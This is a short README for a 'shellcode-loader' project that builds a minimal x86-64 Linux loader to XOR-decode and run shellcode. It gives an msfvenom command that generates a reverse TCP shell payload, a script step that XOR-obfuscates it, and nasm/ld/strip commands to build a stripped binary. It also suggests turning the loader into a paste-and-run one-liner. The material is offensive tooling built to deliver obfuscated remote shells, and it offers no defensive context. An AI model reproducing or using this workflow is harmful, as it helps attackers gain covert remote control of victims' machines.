# shellcode-loader
very simple shellcode loader with xor decoding optimized for size. The maximum size of the shellcode is currently 4096 bytes but you can adjust it in the loader.asm if you need more. This is x86-64 only

# how to use

generate raw shellcode with whatever tool / framework. An example would be metasploit

```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=80 -f raw > shellcode.bin
```

then generate the xor payload. Please make sure that the key in xor_file.py and loader.asm is the same

```
python3 xor_file.py shellcode.bin
```

copy the output of this in msg variable of loader.asm then build with either build.sh or these steps

```
nasm -f elf64 -o loader.o loader.asm
ld -nostdlib --nmagic -o loader loader.o
strip --strip-section-headers loader
```

you can then run this loader however you want. You can even convert it into an all in one cut and paste command as this should be very very small
